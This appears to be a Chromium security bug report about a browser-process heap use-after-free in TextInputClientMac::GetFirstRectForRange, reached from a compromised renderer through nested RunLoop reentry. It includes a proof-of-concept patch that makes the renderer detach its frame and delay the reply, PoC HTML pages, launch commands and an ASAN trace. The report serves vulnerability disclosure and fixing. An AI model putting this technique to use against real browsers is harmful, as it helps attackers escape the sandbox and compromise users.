# Use-after-free in TextInputClientMac::GetFirstRectForRange via nested RunLoop reentry leads to browser process crash from a compromised renderer

| Field | Value |
|-------|-------|
| **Issue ID** | [487357838](https://issues.chromium.org/issues/487357838) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals |
| **Platforms** | Mac |
| **Reporter** | je...@gmail.com |
| **Assignee** | jo...@google.com |
| **Created** | 2026-02-25 |
| **Bounty** | $36,000.00 |

## Description

## Title

Use-after-free in TextInputClientMac::GetFirstRectForRange via nested RunLoop reentry leads to browser process crash from a compromised renderer

## Summary

When the feature flag `kTextInputClientUseNestedLoop` is enabled, `TextInputClientMac::GetFirstRectForRange` in the browser process holds a raw `RenderWidgetHost*` across a nested `base::RunLoop` that pumps UI-thread tasks. A compromised renderer in a cross-origin child frame can exploit this by sending `FrameHost::Detach()` to destroy the child's `RenderWidgetHost` during the wait, then sending a delayed `GotFirstRectForRange` response to exit the loop. The browser process subsequently dereferences the freed pointer, resulting in a heap-use-after-free. The ASAN report confirms the crash occurs in the browser process on thread T0 (CrBrowserMain), and MiraclePtr does not protect this access.

## Bisect

Introducing Commit: dc85d27087b6fc2760d01f82c4ec565c3d7defaa

- Date: 2026-02-06
- Author: Joe Mason [joenotcharles@google.com](mailto:joenotcharles@google.com)
- Review: <https://chromium-review.googlesource.com/c/chromium/src/+/7548367>

## Root Cause

The function `TextInputClientMac::GetFirstRectForRange` in `content/browser/renderer_host/text_input_client_mac.mm` accepts a raw `RenderWidgetHost* rwh` parameter. When `features::kTextInputClientUseNestedLoop` is true, it enters a nested RunLoop via `EnterNestedLoop()` to synchronously wait for the renderer's reply. The nested loop is constructed with `base::RunLoop::Type::kNestableTasksAllowed`, which pumps UI-thread posted tasks while waiting:

```
// content/browser/renderer_host/text_input_client_mac.mm
gfx::Rect TextInputClientMac::GetFirstRectForRange(RenderWidgetHost* rwh,
                                                   const gfx::Range& range) {
  RenderFrameHostImpl* rfhi = GetFocusedRenderFrameHostImpl(rwh);
  if (!rfhi) {
    return gfx::Rect();
  }

  BeforeRequest();
  async_request_delegate_->GetFirstRectForRange(rfhi, current_request_.value(), range);
  if (features::kTextInputClientUseNestedLoop.Get()) {
    EnterNestedLoop(wait_timeout);  // pumps UI-thread tasks via kNestableTasksAllowed
  }
  // ...
  // After the loop exits, rwh may have been destroyed:
  gfx::Rect rect =
      first_rect_ ? gfx::Rect(rwh->GetView()->TransformPointToRootCoordSpace(
                                    first_rect_->origin()),
                                first_rect_->size())
                    : gfx::Rect();  // UAF dereference of rwh here

```

The `EnterNestedLoop` method creates a run loop that processes posted tasks during the wait:

```
// content/browser/renderer_host/text_input_client_mac.mm
void TextInputClientMac::EnterNestedLoop(base::TimeDelta timeout) {
  base::RunLoop& run_loop = *nested_loop_;
  {
    base::AutoUnlock unlock(lock_);
    base::OneShotTimer nested_loop_timer;
    nested_loop_timer.Start(FROM_HERE, timeout, this,
                            &TextInputClientMac::OnNestedLoopTimeout);
    base::ScopedRestrictNSEventMask event_mask(
        base::PassKey<TextInputClientMac>{});
    run_loop.Run();  // pumps posted tasks while waiting
  }
  nested_loop_.reset();
}

```

Although `ScopedRestrictNSEventMask` blocks AppKit NSEvents from being pumped during the nested loop, it does not block Mojo IPC messages or PostTask'd work. The CFRunLoop work sources that process the task queue operate independently of the NSEvent mask filtering. This means that when a compromised renderer sends `FrameHost::Detach()`, the browser processes the detach as a posted task during the nested loop, destroying the child frame's `RenderFrameHostImpl`, `FrameTreeNode`, and ultimately the `RenderWidgetHostImpl` that `rwh` points to.

It is also worth noting that reaching this vulnerable code path requires bypassing a caching layer. `RenderWidgetHostViewMac::SyncGetFirstRectForRange` first calls `GetCachedFirstRectForCharacterRange`, which uses composition character bounds cached from `ImeCompositionRangeChanged` updates. If the cache hits, the synchronous IPC to the renderer is skipped entirely. A compromised renderer must send empty `character_bounds` in `ImeCompositionRangeChanged` to force the cache to miss, which causes the code to fall through to `TextInputClientMac::GetFirstRectForRange`:

```
// content/browser/renderer_host/render_widget_host_view_mac.mm
bool RenderWidgetHostViewMac::SyncGetFirstRectForRange(...) {
  if (!GetCachedFirstRectForCharacterRange(requested_range, rect, actual_range)) {
    // Cache miss — falls through to the vulnerable sync IPC path
    gfx::Rect blink_rect =
        TextInputClientMac::GetInstance()->GetFirstRectForRange(
            GetFocusedWidget(), requested_range);
    // ...
  }
}

```

The `RenderWidgetHost*` parameter is a plain pointer extracted from `GetFocusedWidget()` at the call site. Although `RenderWidgetHostViewBase::host_` uses `raw_ptr<RenderWidgetHostImpl, DanglingUntriaged>`, once extracted and passed as a function parameter it loses MiraclePtr protection. The ASAN report confirms: "MiraclePtr Status: NOT PROTECTED. This crash is still exploitable with MiraclePtr."

The feature gate `kTextInputClientUseNestedLoop` defaults to false in `content/common/features.cc`, but a field trial configuration exists in `testing/variations/fieldtrial_testing_config.json` (entry "TextInputClientNestedLoop") that enables `use_nested_loop=true` on the Mac platform.

## Reproduce

This vulnerability requires the compromised renderer threat model and a macOS environment with a CJK input method (e.g., Chinese Simplified Pinyin) installed. Two renderer-side source modifications simulate the compromised renderer behavior, and the trigger requires real IME interaction to invoke the `firstRectForCharacterRange:` AppKit callback.

Save the following diff as `patch.diff` and apply it from the repository root with `git apply patch.diff`. The patch modifies two renderer-process files:

```
diff --git a/third_party/blink/renderer/core/frame/local_frame_mojo_handler.cc b/third_party/blink/renderer/core/frame/local_frame_mojo_handler.cc
--- a/third_party/blink/renderer/core/frame/local_frame_mojo_handler.cc
+++ b/third_party/blink/renderer/core/frame/local_frame_mojo_handler.cc
@@ -6,6 +6,7 @@

 #include "base/metrics/histogram_functions.h"
 #include "base/numerics/safe_conversions.h"
+#include "base/threading/platform_thread.h"
 #include "base/time/time.h"
 #include "base/unguessable_token.h"
 #include "build/build_config.h"
@@ -1011,6 +1012,16 @@ void LocalFrameMojoHandler::GetFirstRectForRange(
     text_input_host_->GotFirstRectForRange(request_token, rect);
   };

+  // [EXPLOIT] Compromised renderer: if this is a child frame (OOPIF),
+  // send Detach() to destroy the child RWH on the browser side, then
+  // delay the GotFirstRectForRange response to create a UAF window.
+  if (!frame_->IsMainFrame()) {
+    frame_->GetLocalFrameHostRemote().Detach();
+    base::PlatformThread::Sleep(base::Milliseconds(500));
+    rect = gfx::Rect(0, 0, 100, 20);
+    return;  // absl::Cleanup will send the response
+  }
+
   WebLocalFrameClient* client = WebLocalFrameImpl::FromFrame(frame_)->Client();
   if (!client) {
     return;
diff --git a/third_party/blink/renderer/platform/widget/widget_base.cc b/third_party/blink/renderer/platform/widget/widget_base.cc
--- a/third_party/blink/renderer/platform/widget/widget_base.cc
+++ b/third_party/blink/renderer/platform/widget/widget_base.cc
@@ -1363,7 +1363,7 @@ void WidgetBase::UpdateCompositionInfo(bool immediate_request) {
   if (mojom::blink::WidgetInputHandlerHost* host =
           widget_input_handler_manager_->GetWidgetInputHandlerHost()) {
     host->ImeCompositionRangeChanged(composition_range_,
-                                     composition_character_bounds_);
+                                     Vector<gfx::Rect>());
   }
 }


```

The first modification is in `third_party/blink/renderer/core/frame/local_frame_mojo_handler.cc`. When the browser sends a `GetFirstRectForRange` request to a child frame (OOPIF), the compromised renderer intercepts it and immediately calls `FrameHost::Detach()` via Mojo to tell the browser to destroy the child frame's `RenderWidgetHost`. It then sleeps 500ms to give the browser time to process the destruction, and finally lets the `GotFirstRectForRange` response fire via `absl::Cleanup`. This response arrives at the browser after the `RenderWidgetHost` has been freed, causing the UAF when the browser dereferences the stale pointer.

The second modification is in `third_party/blink/renderer/platform/widget/widget_base.cc`. Normally, `ImeCompositionRangeChanged` sends composition character bounds to the browser, which caches them in `RenderWidgetHostViewMac`. When the AppKit IME asks for character rects, the browser serves them from this cache and never enters the vulnerable synchronous IPC path. The compromised renderer sends empty character bounds instead, forcing a cache miss in `GetCachedFirstRectForCharacterRange` and causing the browser to fall through to `TextInputClientMac::GetFirstRectForRange` where the bug resides.

Build:

```
autoninja -C out/asan-release chrome

```

Serve the PoC files from a local HTTP server:

```
python3 -m http.server 8888 --bind 0.0.0.0  # run in the directory containing poc.html

```

The PoC consists of two HTML files. The main page (`poc.html`) embeds a cross-origin child iframe that becomes an out-of-process iframe (OOPIF) with its own `RenderWidgetHost`:

```
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>PoC</title></head>
<body>
<p>Cross-origin child iframe (OOPIF with separate RenderWidgetHost):</p>
<iframe id="child" src="http://evil.test:8888/child.html"
        width="500" height="200"></iframe>
</body>
</html>

```

The child frame (`child.html`) contains a contenteditable div that receives IME input:

```
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
<div id="editor" contenteditable="true">Type here with CJK IME...</div>
<script>document.getElementById('editor').focus();</script>
</body>
</html>

```

Launch Chrome with the nested loop feature enabled and host resolver rules for the cross-origin OOPIF:

```
ASAN_OPTIONS=detect_odr_violation=0 out/asan-release/Chromium.app/Contents/MacOS/Chromium \
  --no-proxy-server \
  --user-data-dir=/tmp/chrome-poc-$(date +%s) \
  --enable-features="TextInputClient:use_nested_loop/true" \
  --host-resolver-rules="MAP evil.test 127.0.0.1" \
  --enable-logging=stderr \
  http://localhost:8888/poc.html

```

Once the page loads, switch to a CJK IME (Chinese Simplified Pinyin), click inside the contenteditable div in the child iframe, and type pinyin characters such as "nihao" without pressing Enter to commit. The IME candidate window must remain open with uncommitted composition text, because AppKit queries `firstRectForCharacterRange:` to position the candidate window relative to the composition caret. This query enters the vulnerable synchronous IPC code path, and the browser process crashes immediately with a heap-use-after-free.

ASAN output:

```
=================================================================
==88607==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00057d080 at pc 0x0001396afff8 bp 0x00016b3484f0 sp 0x00016b3484e8
READ of size 8 at 0x61d00057d080 thread T0
    #0 0x0001396afff4 in content::TextInputClientMac::GetFirstRectForRange(content::RenderWidgetHost*, gfx::Range const&)+0x988 ($SRC/out/asan-release/libcontent.dylib:arm64+0x2e73ff4)
    #1 0x0001396a2518 in content::RenderWidgetHostViewMac::SyncGetFirstRectForRange(gfx::Range const&, gfx::Rect*, gfx::Range*, bool*)+0x240 ($SRC/out/asan-release/libcontent.dylib:arm64+0x2e66518)
    #2 0x0001396a29f8 in non-virtual thunk to content::RenderWidgetHostViewMac::SyncGetFirstRectForRange(gfx::Range const&, gfx::Rect*, gfx::Range*, bool*)+0xc ($SRC/out/asan-release/libcontent.dylib:arm64+0x2e669f8)
    #3 0x00013964df08 in -[RenderWidgetHostViewCocoa firstRectForCharacterRange:actualRange:]+0x1c0 ($SRC/out/asan-release/libcontent.dylib:arm64+0x2e11f08)
    #4 0x0001a0c60494 in -[NSTextInputContext(NSInputContext_WithCompletion) firstRectForCharacterRange:completionHandler:]+0x88 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0xcf1494)
    #5 0x0001a0c5aba4 in __55-[NSTextInputContext handleTSMEvent:completionHandler:]_block_invoke.330+0xd0 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0xcebba4)
    #6 0x0001a0c57840 in __178-[NSTextInputContext tryHandleTSMEvent_offsetToPos_markedOrSelRange_withContext:markedOrSelRangeDispatchCondition:markedRangeContinuation:selectedRangeContinuation:continuation:]_block_invoke+0x6c (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0xce8840)
    #7 0x0001a0c57764 in -[NSTextInputContext tryHandleTSMEvent_offsetToPos_markedOrSelRange_withContext:markedOrSelRangeDispatchCondition:markedRangeContinuation:selectedRangeContinuation:continuation:]+0x8c (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0xce8764)
    #8 0x0001a0c5a858 in __55-[NSTextInputContext handleTSMEvent:completionHandler:]_block_invoke.309+0x158 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0xceb858)
    #9 0x0001a01505cc in -[NSTextInputContext handleTSMEvent:completionHandler:]+0x7e0 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x1e15cc)
    #10 0x0001a014fd7c in _NSTSMEventHandler+0x140 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x1e0d7c)
    #11 0x0001a7b1aed4 in DispatchEventToHandlers(EventTargetRec*, OpaqueEventRef*, HandlerCallRec*)+0x4d8 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0xb6ed4)
    #12 0x0001a7b2bd40 in SendEventToEventTargetInternal(OpaqueEventRef*, OpaqueEventTargetRef*, HandlerCallRec*)+0x138 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0xc7d40)
    #13 0x0001a7caf30c in SendEventToEventTargetWithOptions+0x28 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x24b30c)
    #14 0x0001a7b9ec88 in SendTSMEvent_WithCompletionHandler+0x1ac (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x13ac88)
    #15 0x0001a7b9f9c8 in __SendTextInputEvent_WithCompletionHandler_block_invoke+0x244 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x13b9c8)
    #16 0x0001a7b9d844 in SendTextInputEvent_WithCompletionHandler+0x430 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x139844)
    #17 0x0001a7c1c800 in -[IMKInputSession_Modern _postEvent:completionHandler:]+0xac (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1b8800)
    #18 0x0001a7c1c700 in -[IMKInputSession_Modern _createAndSendOffsetToPointEvent:completionHandler:]+0x154 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1b8700)
    #19 0x0001a7c318b4 in -[IMKInputSession_Modern attributesForCharacterIndex_andLineRect:completionHandler:]+0x1e0 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1cd8b4)
    #20 0x0001a7c3219c in -[IMKInputSession_Modern attributesForCharacterIndex:completionHandler:]+0x5c (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1ce19c)
    #21 0x0001a7c1e000 in __67-[IMKInputSession_Modern imkxpc_attributesForCharacterIndex:reply:]_block_invoke+0x1bc (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1ba000)
    #22 0x0001a7c0e2c0 in __57+[IMKInputSession_Modern IMKXPCPerformBlockOnMainThread:]_block_invoke+0x20 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1aa2c0)
    #23 0x0001a2e255d4 in invocation function for block in wrapBlockWithVoucher(void () block_pointer)+0x34 (/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/HIServices:arm64e+0x405d4)
    #24 0x0001a2e25174 in _ZL24deferredBlockOpportunity_block_invoke_2+0x1f0 (/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/HIServices:arm64e+0x40174)
    #25 0x00019c0866b0 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_BLOCK__+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x7c6b0)
    #26 0x00019c0865c0 in __CFRunLoopDoBlocks+0x15c (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x7c5c0)
    #27 0x00019c085a6c in __CFRunLoopRun+0x94c (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x7ba6c)
    #28 0x00019c084a94 in CFRunLoopRunSpecific+0x238 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x7aa94)
    #29 0x0001a2e2460c in __60-[HIRunLoopSemaphore invokeLoopInModeForDuration:withBlock:]_block_invoke_2+0x24 (/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/HIServices:arm64e+0x3f60c)
    #30 0x0001a2e3f078 in -[HIRunLoopSemaphore mediaTime:]+0x30 (/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/HIServices:arm64e+0x5a078)
    #31 0x0001a2e3f164 in -[HIRunLoopSemaphore invokeLoopInModeForDuration:withBlock:]+0xc4 (/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/HIServices:arm64e+0x5a164)
    #32 0x0001a2e24ab4 in __27-[HIRunLoopSemaphore wait:]_block_invoke_3+0x68 (/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/HIServices:arm64e+0x3fab4)
    #33 0x0001a2e24a40 in __CONSIDER_WHO_REQUESTED_THIS_WAIT_BEFORE_SENDING_BUG_TO_HISERVICES__(void () block_pointer)+0x14 (/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/HIServices:arm64e+0x3fa40)
    #34 0x0001a2e249f4 in __27-[HIRunLoopSemaphore wait:]_block_invoke_2+0x8c (/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/HIServices:arm64e+0x3f9f4)
    #35 0x0001a2e244b4 in -[HIRunLoopSemaphore whileInhibitingCFRunLoopRunFinished:perform:]+0x7c (/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/HIServices:arm64e+0x3f4b4)
    #36 0x0001a2e24958 in __27-[HIRunLoopSemaphore wait:]_block_invoke+0x70 (/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/HIServices:arm64e+0x3f958)
    #37 0x0001a2e239e8 in +[HIRunLoopSemaphore _observe:whilePerforming:]+0x238 (/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/HIServices:arm64e+0x3e9e8)
    #38 0x0001a2e24784 in -[HIRunLoopSemaphore wait:]+0xc8 (/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/HIServices:arm64e+0x3f784)
    #39 0x0001a7c0d96c in __62-[IMKInputSessionXPCInvocation_Modern invocationAwaitXPCReply]_block_invoke+0x44 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1a996c)
    #40 0x0001a7c0e4c0 in +[IMKInputSession_Modern withActivity:performActions:]+0x1b4 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1aa4c0)
    #41 0x0001a7cfda58 in -[IMKInputSessionXPCInvocation_Modern invocationAwaitXPCReply]+0x70 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x299a58)
    #42 0x0001a7c11b8c in __56-[IMKInputSession_Modern handleEvent:completionHandler:]_block_invoke_2.313+0x47c (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1adb8c)
    #43 0x0001a7c11288 in __56-[IMKInputSession_Modern handleEvent:completionHandler:]_block_invoke_2.289+0x228 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1ad288)
    #44 0x0001a7bf0300 in -[IMKClient_Modern switchedInputMode:completionHandler:]+0x19c (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x18c300)
    #45 0x0001a7c10310 in -[IMKInputSession_Modern tryHandleEventSwitchedInputMode:eventWasHandled:continuationHandler:]+0x88 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1ac310)
    #46 0x0001a7c10ffc in __56-[IMKInputSession_Modern handleEvent:completionHandler:]_block_invoke.288+0xd0 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1acffc)
    #47 0x0001a7c10e10 in __56-[IMKInputSession_Modern handleEvent:completionHandler:]_block_invoke+0x14c (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1ace10)
    #48 0x0001a7c1a528 in -[IMKInputSession_Modern _eventIsOn:completionHandler:]+0x988 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1b6528)
    #49 0x0001a7c1084c in -[IMKInputSession_Modern handleEvent:completionHandler:]+0x2a0 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1ac84c)
    #50 0x0001a7bb3210 in IMKInputSessionProcessEventRefWithCompletionHandler+0x8c (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x14f210)
    #51 0x0001a7bb2700 in InputMethodInstanceProcessEventRef_WithCompletionHandler+0xa0 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x14e700)
    #52 0x0001a7b9cc94 in __TSMEventToInputMethod_WithCompletionHandler_block_invoke+0x94 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x138c94)
    #53 0x0001a7ba0b40 in __SendTSMDocumentLockEvent_WithCompletionHandler_block_invoke+0x70 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x13cb40)
    #54 0x0001a7b1b51c in invocation function for block in DispatchEventToHandlers(EventTargetRec*, OpaqueEventRef*, HandlerCallRec*)+0x90 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0xb751c)
    #55 0x0001a0150ee4 in -[NSTextInputContext handleTSMEvent:completionHandler:]+0x10f8 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x1e1ee4)
    #56 0x0001a014fd7c in _NSTSMEventHandler+0x140 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x1e0d7c)
    #57 0x0001a7b1aed4 in DispatchEventToHandlers(EventTargetRec*, OpaqueEventRef*, HandlerCallRec*)+0x4d8 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0xb6ed4)
    #58 0x0001a7b2bd40 in SendEventToEventTargetInternal(OpaqueEventRef*, OpaqueEventTargetRef*, HandlerCallRec*)+0x138 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0xc7d40)
    #59 0x0001a7caf30c in SendEventToEventTargetWithOptions+0x28 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x24b30c)
    #60 0x0001a7b9ec88 in SendTSMEvent_WithCompletionHandler+0x1ac (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x13ac88)
    #61 0x0001a7b9cb80 in TrySendLockEvent_BeforeEventToInputMethod_WithContinuationHandler+0x180 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x138b80)
    #62 0x0001a7b9c99c in TSMEventToInputMethod_WithCompletionHandler+0xac (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x13899c)
    #63 0x0001a7b9c8a4 in TSMEventToKeyboardInputMethod_WithCompletionHandler+0x9c (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1388a4)
    #64 0x0001a7b9b8fc in TSMKeyEvent_WithCompletionHandler+0x254 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1378fc)
    #65 0x0001a7ba5c70 in __TSMProcessRawKeyEventWithOptionsAndCompletionHandler_block_invoke_5+0x134 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x141c70)
    #66 0x0001a7ba5b20 in __TSMProcessRawKeyEventWithOptionsAndCompletionHandler_block_invoke_4+0x194 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x141b20)
    #67 0x0001a7ba58d8 in __TSMProcessRawKeyEventWithOptionsAndCompletionHandler_block_invoke_3+0x15c (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1418d8)
    #68 0x0001a7ba5654 in __TSMProcessRawKeyEventWithOptionsAndCompletionHandler_block_invoke_2+0x15c (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x141654)
    #69 0x0001a7ba53d0 in __TSMProcessRawKeyEventWithOptionsAndCompletionHandler_block_invoke+0x154 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x1413d0)
    #70 0x0001a7ba4f0c in TSMProcessRawKeyEventWithOptionsAndCompletionHandler+0xa94 (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:arm64e+0x140f0c)
    #71 0x0001a0c5d844 in __84-[NSTextInputContext _handleEvent:options:allowingSyntheticEvent:completionHandler:]_block_invoke_3.708+0x90 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0xcee844)
    #72 0x0001a0c5d510 in __204-[NSTextInputContext tryTSMProcessRawKeyEvent_orSubstitution:dispatchCondition:setupForDispatch:furtherCondition:doubleSpaceSubstitutionCondition:doubleSpaceSubstitutionWork:dispatchTSMWork:continuation:]_block_invoke.691+0xb0 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0xcee510)
    #73 0x0001a014eb14 in -[NSTextInputContext tryTSMProcessRawKeyEvent_orSubstitution:dispatchCondition:setupForDispatch:furtherCondition:doubleSpaceSubstitutionCondition:doubleSpaceSubstitutionWork:dispatchTSMWork:continuation:]+0x14c (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x1dfb14)
    #74 0x0001a014e530 in -[NSTextInputContext _handleEvent:options:allowingSyntheticEvent:completionHandler:]+0x5b0 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x1df530)
    #75 0x0001a014df3c in -[NSTextInputContext _handleEvent:allowingSyntheticEvent:]+0x80 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x1def3c)
    #76 0x0001a014dd94 in -[NSView interpretKeyEvents:]+0x98 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x1ded94)
    #77 0x000139648158 in -[RenderWidgetHostViewCocoa keyEvent:wasKeyEquivalent:]+0xaf4 ($SRC/out/asan-release/libcontent.dylib:arm64+0x2e0c158)
    #78 0x000139647628 in -[RenderWidgetHostViewCocoa keyEvent:]+0x9c ($SRC/out/asan-release/libcontent.dylib:arm64+0x2e0b628)
    #79 0x000106adec2c in -[BaseView keyDown:]+0xc8 ($SRC/out/asan-release/libui_base.dylib:arm64+0x8ac2c)
    #80 0x0001a00cfb90 in -[NSWindow(NSEventRouting) _reallySendEvent:isDelayedEvent:]+0x128 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x160b90)
    #81 0x0001a00cf89c in -[NSWindow(NSEventRouting) sendEvent:]+0x11c (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x16089c)
    #82 0x0001420983b8 in -[NativeWidgetMacNSWindow sendEvent:]+0x3b8 ($SRC/out/asan-release/libcomponents_remote_cocoa_app_shim.dylib:arm64+0x303b8)
    #83 0x0001a0947a18 in -[NSApplication(NSEventRouting) sendEvent:]+0x938 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x9d8a18)
    #84 0x000123cff274 in __34-[BrowserCrApplication sendEvent:]_block_invoke+0x270 ($SRC/out/asan-release/libchrome_dll.dylib:arm64+0x598f274)
    #85 0x0001074b4df8 in base::apple::CallWithEHFrame(void () block_pointer)+0xc ($SRC/out/asan-release/libbase.dylib:arm64+0x3f0df8)
    #86 0x000123cfea98 in -[BrowserCrApplication sendEvent:]+0x868 ($SRC/out/asan-release/libchrome_dll.dylib:arm64+0x598ea98)
    #87 0x0001a0546428 in -[NSApplication _handleEvent:]+0x38 (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:arm64e+0x5d7428)
